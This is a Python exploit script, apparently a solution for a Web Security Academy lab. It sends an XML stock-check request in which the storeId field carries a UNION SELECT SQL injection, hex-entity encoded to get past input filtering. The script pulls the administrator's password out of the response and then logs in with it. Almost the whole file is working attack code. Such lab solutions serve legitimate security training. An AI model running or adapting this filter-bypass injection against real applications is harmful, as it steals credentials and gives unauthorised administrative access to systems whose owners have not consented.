# usage:
# python3 15.py \
# --u https://0aaa00a7037819be80f76c960063008a.web-security-academy.net

import http.client
import re
import string
import xml.etree.ElementTree as ET
from argparse import ArgumentParser

import requests

ALPHANUM = list(string.digits + string.ascii_lowercase)
http.client.HTTPConnection.debuglevel = 1


class Solution:
    def __init__(self, url: str) -> None:
        self.url = url.rstrip("/")
        self.s = None

    def login(self, username: str, password: str) -> requests.Response:
        self.s = requests.Session()
        login_url = f"{self.url}/login"
        r = self.s.get(login_url)
        csrf = re.findall(r"\"csrf\" value=\"([\w]+)\"", r.text)[0]
        r = self.s.post(
            login_url,
            data={
                "csrf": csrf,
                "username": username,
                "password": password,
            },
        )

        return r

    def solve(self) -> None:
        query = "UNION SELECT password FROM users WHERE username='administrator'--"
        hex_encoding = ";".join([f"&#x{hex(ord(c))}" for c in query])

        payload = ET.Element("stockCheck")
        ET.SubElement(payload, "productId").text = "1"
        ET.SubElement(payload, "storeId").text = f"1 {hex_encoding};"
        payload = ET.tostring(payload).replace(b"amp;#x0", b"#")

        self.s = requests.Session()
        r = self.s.post(
            f"{self.url}/product/stock",
            headers={"Content-Type": "application/xml"},
            data=payload,
        )
        password = re.findall(r"units\s([\w]+)", r.text)[0]

        print(f"Password found! -- {password}")
        self.login("administrator", password)


def main():
    parser = ArgumentParser()
    parser.add_argument("--u", "--url", dest="url")
    args = parser.parse_args()
    s = Solution(args.url)
    s.solve()


if __name__ == "__main__":
    main()
